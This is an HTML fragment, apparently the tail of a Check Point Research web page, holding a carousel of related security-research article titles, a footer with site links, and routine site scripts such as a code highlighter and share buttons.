						<img width="1021" height="580" src="//research.checkpoint.com/wp-content/uploads/2020/07/GooglePlayBanner-Social-1021x580B.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" loading="lazy" />						<h3>New Joker variant hits Google Play with an old trick</h3>
					</a>
				</div>
							<div class="carousel-cell">
					<a href="//research.checkpoint.com/2020/apache-guacamole-rce/">
						<img width="1021" height="580" src="//research.checkpoint.com/wp-content/uploads/2020/06/Guacamole_CPR_FINAL-F-1021x580-3.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" loading="lazy" />						<h3>Would you like some RCE with your Guacamole?</h3>
					</a>
				</div>
							<div class="carousel-cell">
					<a href="//research.checkpoint.com/2020/the-turkish-rat-distributes-evolved-adwind-in-a-massive-ongoing-phishing-campaign/">
						<img width="1021" height="580" src="//research.checkpoint.com/wp-content/uploads/2020/02/CheckPointResearchTurkishRat_blog_header.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" loading="lazy" />						<h3>“The Turkish Rat” Evolved Adwind in a Massive Ongoing Phishing Campaign</h3>
					</a>
				</div>
							<div class="carousel-cell">
					<a href="//research.checkpoint.com/2020/remote-cloud-execution-critical-vulnerabilities-in-azure-cloud-infrastructure-part-i/">
						<img width="1021" height="580" src="//research.checkpoint.com/wp-content/uploads/2020/01/CheckPointResearchAzureStack_blog_header-FINAL-1.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" loading="lazy" />						<h3>Remote Cloud Execution &#8211; Critical Vulnerabilities in Azure Cloud Infrastructure (Part I)</h3>
					</a>
				</div>
							<div class="carousel-cell">
					<a href="//research.checkpoint.com/2019/canadian-banks-targeted-in-a-massive-phishing-campaign/">
						<img width="1021" height="580" src="//research.checkpoint.com/wp-content/uploads/2019/12/PhishingCanadianBanks_blog_1021x580-1.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" loading="lazy" />						<h3>Canadian banks targeted in a massive phishing campaign</h3>
					</a>
				</div>
							<div class="carousel-cell">
					<a href="//research.checkpoint.com/2021/17th-may-threat-intelligence-report/">
						<img width="1021" height="580" src="//research.checkpoint.com/wp-content/uploads/2020/05/ThreatIntelligenceBulletin.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" loading="lazy" />						<h3>17th May &#8211; Threat Intelligence Report</h3>
					</a>
				</div>
							<div class="carousel-cell">
					<a href="//research.checkpoint.com/2021/the-need-to-protect-public-aws-ssm-documents-what-the-research-shows/">
						<img width="1021" height="580" src="//research.checkpoint.com/wp-content/uploads/2021/05/CPR.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" loading="lazy" />						<h3>The Need to Protect Public AWS SSM Documents &#8211; What the Research Shows</h3>
					</a>
				</div>
							<div class="carousel-cell">
					<a href="//research.checkpoint.com/2021/10th-may-threat-intelligence-report/">
						<img width="1021" height="580" src="//research.checkpoint.com/wp-content/uploads/2020/05/ThreatIntelligenceBulletin.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" loading="lazy" />						<h3>10th May &#8211; Threat Intelligence Report</h3>
					</a>
				</div>
							<div class="carousel-cell">
					<a href="//research.checkpoint.com/2021/security-probe-of-qualcomm-msm/">
						<img width="1200" height="628" src="//research.checkpoint.com/wp-content/uploads/2021/04/5G.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" loading="lazy" />						<h3>Security probe of Qualcomm MSM data services</h3>
					</a>
				</div>
						</div>
		</div>
	</div>
	<!-- <div class="col-md-4" id="sidebar">
		<div id="custom_html-3" class="widget_text widget_custom_html"><h3>Check Point Blog</h3><div class="textwidget custom-html-widget"><ul>
<li><a class="rsswidget" href="https://blog.checkpoint.com/2020/08/06/achilles-small-chip-big-peril/">Achilles: Small chip, big peril.</a></li>
<li><a class="rsswidget" href="https://blog.checkpoint.com/2020/07/21/how-scammers-are-hiding-their-phishing-trips-in-public-clouds/">How scammers are hiding their phishing trips in public clouds</a></li>
<li><a class="rsswidget" href="https://blog.checkpoint.com/2020/07/16/fixing-the-zoom-vanity-clause-check-point-and-zoom-collaborate-to-fix-vanity-url-issue/">Fixing the Zoom ‘Vanity Clause’ – Check Point and Zoom collaborate to fix Vanity URL issue</a></li>
<li><a class="rsswidget" href="https://blog.checkpoint.com/2020/07/03/nexus-zeta-from-suspicious-alerts-to-conviction/">Nexus Zeta – From Suspicious Alerts to Conviction</a></li>
<li><a class="rsswidget" href="https://blog.checkpoint.com/2020/06/25/as-organizations-get-back-to-business-cyber-criminals-look-for-new-angles-to-exploit/">As organizations get back to business, cyber criminals look for new angles to exploit</a></li>
</ul></div></div>	</div> -->
</div>
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript" src="//platform-api.sharethis.com/js/sharethis.js#property=5a3031770f16c70012a3c297&product=sticky-share-buttons"></script>
</div>
<footer id="inc-footer">
    <div class="inc-wrapper">
        <div class="inc-footer-col">
            <span class="inc-footer-title">Publications</span>
            <ul>
                <li><a href="https://research.checkpoint.com/category/threat-intelligence-reports/">GLOBAL CYBER ATTACK REPORTS</a></li>
                <li><a href="https://research.checkpoint.com/category/threat-research/">RESEARCH PUBLICATIONS</a></li>
                <li><a href="https://www.checkpoint.com/advisories/">IPS ADVISORIES</a></li>
                <li><a href="http://blog.checkpoint.com/">CHECK POINT BLOG</a></li>
                <li><a href="https://research.checkpoint.com/category/demos/">DEMOS</a></li>
            </ul>
        </div>
        <div class="inc-footer-col">
            <span class="inc-footer-title">Tools</span>
            <ul>
                <li><a href="https://threatemulation.checkpoint.com/">SANDBLAST FILE ANALYSIS</a></li>
                <li><a href="https://www.checkpoint.com/urlcat/">URL CATEGORIZATION</a></li>
                <li><a href="http://www.cpcheckme.com/checkme/">INSTANT SECURITY ASSESSMENT</a></li>
                <li><a href="https://threatmap.checkpoint.com/ThreatPortal/livemap.html">LIVE THREAT MAP</a></li>
            </ul>
        </div>
        <div class="inc-footer-col">
            <a href="https://research.checkpoint.com/about-us/" class="inc-footer-title">About Us</a>
        </div>
        <div class="inc-footer-col">
            <a href="https://research.checkpoint.com/contact/" class="inc-footer-title">Contact Us</a>
        </div>
        <div class="inc-footer-col">
            <a href="https://research.checkpoint.com/subscription/" class="inc-footer-title">Subscribe</a>
        </div>
        <p id="inc-footer-copyright">&copy; 1994<script>new Date().getFullYear()>1994&&document.write("-"+new Date().getFullYear());</script> Check Point Software Technologies LTD. All rights reserved. <br />Property of <a href="https://www.checkpoint.com/">CheckPoint.com</a> | <a href="https://research.checkpoint.com/privacy-policy/">Privacy Policy</a></p>
    </div>
</footer>

<!-- Modal pop_over -->
<div class="modal fade" id="pop_over" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-body" style="padding: 0 1rem 1rem;">
                <button id="pop_close" type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
                <a href="https://bit.ly/2Pmx8R2" target="_blank"><img src="/wp-content/uploads/2018/11/CfP_1021x580_A.jpg" style="max-height: 290px;" alt="Call For Papers"></a>
            </div>
        </div>
    </div>
</div>

<script type='text/javascript' src='https://research.checkpoint.com/wp-content/plugins/enlighter/cache/enlighterjs.min.js?ver=TJ0/7+iAWMKbDKS' id='enlighterjs-js'></script>
<script type='text/javascript' id='enlighterjs-js-after'>
!function(e,n){if("undefined"!=typeof EnlighterJS){var o={"selectors":{"block":"pre.EnlighterJSRAW","inline":"code.EnlighterJSRAW"},"options":{"indent":4,"ampersandCleanup":true,"linehover":true,"rawcodeDbclick":false,"textOverflow":"break","linenumbers":true,"theme":"enlighter","language":"enlighter","retainCssClasses":false,"collapse":false,"toolbarOuter":"","toolbarTop":"{BTN_RAW}{BTN_COPY}{BTN_WINDOW}{BTN_WEBSITE}","toolbarBottom":""}};(e.EnlighterJSINIT=function(){EnlighterJS.init(o.selectors.block,o.selectors.inline,o.options)})()}else{(n&&(n.error||n.log)||function(){})("Error: EnlighterJS resources not loaded yet!")}}(window,console);
</script>
<script type='text/javascript' src='https://cdn.onesignal.com/sdks/OneSignalSDK.js?ver=5.7.1' async='async' id='remote_sdk-js'></script>
</body>
</html>
